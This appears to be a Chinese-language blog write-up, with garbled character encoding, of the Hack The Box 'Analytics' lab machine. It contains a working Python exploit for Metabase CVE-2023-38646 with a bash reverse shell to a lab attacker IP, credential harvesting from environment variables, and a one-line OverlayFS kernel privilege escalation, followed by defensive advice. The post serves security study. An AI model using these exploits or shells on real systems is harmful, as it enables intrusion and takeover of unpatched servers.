<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HTB: Analytics | HackwithControler</title>
<link rel="stylesheet" href="../static/css/main.css">
</head>
<body>
<header>
    <div class="container">
        <a href="../index.html" class="back">â† è¿”å›é¦–é </a>
    </div>
</header>

<div class="article-layout">
    <!-- Left Sidebar: Article List -->
    <aside class="sidebar-left">
        <h3>ğŸ“ å…¶ä»– Write-ups</h3><div class="sidebar-articles">
            <a href="htb_pilgrimage.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Pilgrimage</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-09-18</span>
                </div>
            </a>
            <a href="htb_keeper.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Keeper</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-10-05</span>
                </div>
            </a>
            <a href="htb_surveillance.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Surveillance</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty medium">Medium</span>
                    <span>2024-11-20</span>
                </div>
            </a>
            <a href="htb_analytics.html" class="sidebar-article-item active">
                <div class="sidebar-article-title">HTB: Analytics</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-12-15</span>
                </div>
            </a></div>
    </aside>

    <!-- Main Content -->
    <main class="article-main">
        <div class="article-header">
            <h1>HTB: Analytics</h1>
            <div class="article-meta">
                <span class="difficulty easy">Easy</span>
                <span>ğŸ“… 2024-12-15</span>
                <span>â± 23 min read</span>
            </div>
            <div class="article-tags"><span class="article-tag">HTB</span><span class="article-tag">Linux</span><span class="article-tag">CVE-2023-38646</span><span class="article-tag">Metabase</span><span class="article-tag">Docker</span></div>
        </div>
        <div class="article-content"><h2 id="_1">æ©Ÿå™¨è³‡è¨Š</h2>
<ul>
<li>å¹³å°: Hack The Box</li>
<li>é›£åº¦: Easy</li>
<li>IP: 10.10.11.233</li>
<li>ä½œæ¥­ç³»çµ±: Linux</li>
</ul>
<h2 id="_2">åµå¯Ÿéšæ®µ</h2>
<p>é¦–å…ˆé€²è¡Œ Nmap æƒæï¼š</p>
<pre class="codehilite"><code class="language-bash">nmap -sC -sV -oN nmap/initial 10.10.11.233
</code></pre>

<p>æƒæçµæœï¼š<br />
- <strong>22/tcp</strong> - SSH (OpenSSH 8.2p1)<br />
- <strong>80/tcp</strong> - HTTP (nginx 1.18.0)</p>
<p>è¨ªå• 80 ç«¯å£ç™¼ç¾ä¸€å€‹æ•¸æ“šåˆ†æå¹³å°ï¼Œä½¿ç”¨ Metabase 0.46.6 ç‰ˆæœ¬ã€‚</p>
<h2 id="_3">æ¼æ´åˆ†æ</h2>
<h3 id="cve-2023-38646-metabase-pre-auth-rce">CVE-2023-38646 - Metabase Pre-Auth RCE</h3>
<p>Metabase ç‰ˆæœ¬ 0.46.6 å­˜åœ¨ä¸€å€‹åš´é‡çš„é èªè­‰é ç¨‹ä»£ç¢¼åŸ·è¡Œæ¼æ´ï¼š</p>
<ol>
<li>æ”»æ“Šè€…å¯ä»¥é€šé <code>/api/setup/validate</code> ç«¯é»</li>
<li>åˆ©ç”¨ setup token ç¹éèªè­‰</li>
<li>åŸ·è¡Œä»»æ„ H2 SQL æŸ¥è©¢</li>
<li>é€šé JDBC é€£æ¥å­—ç¬¦ä¸²å¯¦ç¾ RCE</li>
</ol>
<h3 id="setup-token">å–å¾— Setup Token</h3>
<pre class="codehilite"><code class="language-bash">curl -s http://10.10.11.233/api/session/properties | jq -r '.[&quot;setup-token&quot;]'
</code></pre>

<p>å¾—åˆ° token: <code>249fa03d-fd94-4d5b-b94f-b4ebf3df681f</code></p>
<h2 id="initial-access">Initial Access</h2>
<p>ä½¿ç”¨å…¬é–‹çš„ POC è…³æœ¬é€²è¡Œæ”»æ“Šï¼š</p>
<pre class="codehilite"><code class="language-python">import requests
import base64

target = &quot;http://10.10.11.233&quot;
setup_token = &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;

# Reverse shell payload
payload = f&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1'&quot;
encoded = base64.b64encode(payload.encode()).decode()

# Exploit
exploit = {
    &quot;token&quot;: setup_token,
    &quot;details&quot;: {
        &quot;is_on_demand&quot;: False,
        &quot;is_full_sync&quot;: False,
        &quot;is_sample&quot;: False,
        &quot;cache_ttl&quot;: None,
        &quot;refingerprint&quot;: False,
        &quot;auto_run_queries&quot;: True,
        &quot;schedules&quot;: {},
        &quot;details&quot;: {
            &quot;db&quot;: f&quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {{ Runtime.getRuntime().exec(new String[]{{\&quot;bash\&quot;,\&quot;-c\&quot;,cmd}}); }}$$\\;CALL SHELLEXEC('echo {encoded} | base64 -d | bash')&quot;,
            &quot;advanced-options&quot;: False,
            &quot;ssl&quot;: True
        },
        &quot;name&quot;: &quot;x&quot;,
        &quot;engine&quot;: &quot;h2&quot;
    }
}

requests.post(f&quot;{target}/api/setup/validate&quot;, json=exploit)
</code></pre>

<p>é–‹å•Ÿç›£è½ä¸¦åŸ·è¡Œè…³æœ¬ï¼š</p>
<pre class="codehilite"><code class="language-bash">nc -lvnp 4444
python3 exploit.py
</code></pre>

<p>æˆåŠŸå–å¾— shellï¼Œèº«ä»½ç‚º <code>metabase</code> ç”¨æˆ¶åœ¨ Docker å®¹å™¨å…§ã€‚</p>
<h2 id="_4">æ©«å‘ç§»å‹•</h2>
<h3 id="_5">ç’°å¢ƒè®Šæ•¸ç™¼ç¾æ†‘è­‰</h3>
<p>æª¢æŸ¥ç’°å¢ƒè®Šæ•¸ï¼š</p>
<pre class="codehilite"><code class="language-bash">env | grep -i pass
</code></pre>

<p>ç™¼ç¾ï¼š</p>
<pre class="codehilite"><code>META_USER=metalytics
META_PASS=An4lytics_ds20223#
</code></pre>

<p>å˜—è©¦ SSH ç™»å…¥ä¸»æ©Ÿï¼š</p>
<pre class="codehilite"><code class="language-bash">ssh metalytics@10.10.11.233
# ä½¿ç”¨å¯†ç¢¼: An4lytics_ds20223#
</code></pre>

<p>æˆåŠŸç™»å…¥ï¼å–å¾— user flagï¼š</p>
<pre class="codehilite"><code class="language-bash">cat /home/metalytics/user.txt
</code></pre>

<h2 id="_6">æ¬Šé™æå‡</h2>
<h3 id="_7">ç³»çµ±è³‡è¨Šæ”¶é›†</h3>
<pre class="codehilite"><code class="language-bash">uname -a
# Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu
</code></pre>

<p>é€™æ˜¯ Ubuntu 22.04ï¼Œkernel ç‰ˆæœ¬ 6.2.0-25 å­˜åœ¨å·²çŸ¥çš„æ¬Šé™æå‡æ¼æ´ã€‚</p>
<h3 id="cve-2023-2640-cve-2023-32629-ubuntu-overlayfs">CVE-2023-2640 &amp; CVE-2023-32629 - Ubuntu OverlayFS</h3>
<p>é€™å…©å€‹æ¼æ´å…è¨±æœ¬åœ°ç”¨æˆ¶é€šéæ¿«ç”¨ OverlayFS çš„ copy_up åŠŸèƒ½å¯¦ç¾æ¬Šé™æå‡ã€‚</p>
<p>ä½¿ç”¨ GameOver(lay) ä¸€è¡Œå‘½ä»¤ææ¬Šï¼š</p>
<pre class="codehilite"><code class="language-bash">unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system(&quot;bash&quot;)'
</code></pre>

<p>å‘½ä»¤è§£æï¼š<br />
1. å‰µå»º overlay æ–‡ä»¶ç³»çµ±çµæ§‹<br />
2. è¤‡è£½ python3 åˆ° lower ç›®éŒ„<br />
3. è¨­ç½® CAP_SETUID capability<br />
4. æ›è¼‰ overlay<br />
5. è§¸ç™¼ copy_up æ“ä½œ<br />
6. åˆ©ç”¨ python ææ¬Šåˆ° root</p>
<p>åŸ·è¡Œå¾ŒæˆåŠŸç²å¾— root shellï¼š</p>
<pre class="codehilite"><code class="language-bash">id
# uid=0(root) gid=1000(metalytics) groups=1000(metalytics)

cat /root/root.txt
</code></pre>

<h2 id="flags">Flags</h2>
<pre class="codehilite"><code>user.txt: 7********************************3
root.txt: b********************************8
</code></pre>

<h2 id="_8">ç¸½çµ</h2>
<p>é€™å°æ©Ÿå™¨å±•ç¤ºäº†å…©å€‹é‡è¦çš„å®‰å…¨æ¦‚å¿µï¼š</p>
<ol>
<li><strong>CVE-2023-38646 (Metabase RCE)</strong>: æ‡‰ç”¨ç¨‹åºé èªè­‰æ¼æ´çš„å±å®³æ€§ï¼Œå¼·èª¿äº†åŠæ™‚æ›´æ–°è»Ÿä»¶çš„é‡è¦æ€§</li>
<li><strong>Kernel æ¬Šé™æå‡</strong>: Ubuntu OverlayFS æ¼æ´æé†’æˆ‘å€‘ä¿æŒç³»çµ±æ ¸å¿ƒæ›´æ–°çš„å¿…è¦æ€§</li>
</ol>
<h3 id="_9">é˜²ç¦¦å»ºè­°</h3>
<ul>
<li>å‡ç´š Metabase è‡³æœ€æ–°ç‰ˆæœ¬ (&gt;0.46.6.1)</li>
<li>æ›´æ–° Linux kernel ä¿®è£œ OverlayFS æ¼æ´</li>
<li>é¿å…åœ¨ç’°å¢ƒè®Šæ•¸ä¸­å­˜å„²æ˜æ–‡å¯†ç¢¼</li>
<li>å¯¦æ–½æœ€å°æ¬Šé™åŸå‰‡</li>
<li>å®šæœŸé€²è¡Œå®‰å…¨å¯©è¨ˆ</li>
</ul>
<h2 id="_10">åƒè€ƒè³‡æ–™</h2>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38646">CVE-2023-38646 - Metabase RCE</a></li>
<li><a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">Ubuntu OverlayFS Exploit</a></li>
<li><a href="https://www.metabase.com/blog/security-advisory">Metabase Security Advisory</a></li>
</ul></div>
    </main>

    <!-- Right Sidebar: TOC -->
    <aside class="sidebar-right">
        <h3>ğŸ“‘ ç›®éŒ„</h3><ul class="toc-list">
            <li class="toc-item toc-item-h2">
                <a href="#_1" class="toc-link">æ©Ÿå™¨è³‡è¨Š</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_2" class="toc-link">åµå¯Ÿéšæ®µ</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_3" class="toc-link">æ¼æ´åˆ†æ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#cve-2023-38646-metabase-pre-auth-rce" class="toc-link">CVE-2023-38646 - Metabase Pre-Auth RCE</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#setup-token" class="toc-link">å–å¾— Setup Token</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#initial-access" class="toc-link">Initial Access</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_4" class="toc-link">æ©«å‘ç§»å‹•</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_5" class="toc-link">ç’°å¢ƒè®Šæ•¸ç™¼ç¾æ†‘è­‰</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_6" class="toc-link">æ¬Šé™æå‡</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_7" class="toc-link">ç³»çµ±è³‡è¨Šæ”¶é›†</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#cve-2023-2640-cve-2023-32629-ubuntu-overlayfs" class="toc-link">CVE-2023-2640 &amp;amp; CVE-2023-32629 - Ubuntu OverlayFS</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#flags" class="toc-link">Flags</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_8" class="toc-link">ç¸½çµ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_9" class="toc-link">é˜²ç¦¦å»ºè­°</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_10" class="toc-link">åƒè€ƒè³‡æ–™</a>
            </li></ul>
    </aside>
</div>

<footer>
    <div class="container">
        <p>&copy; 2024 HackwithControler. All rights reserved.</p>
    </div>
</footer>

<script src="../static/js/article.js"></script>
</body>
</html>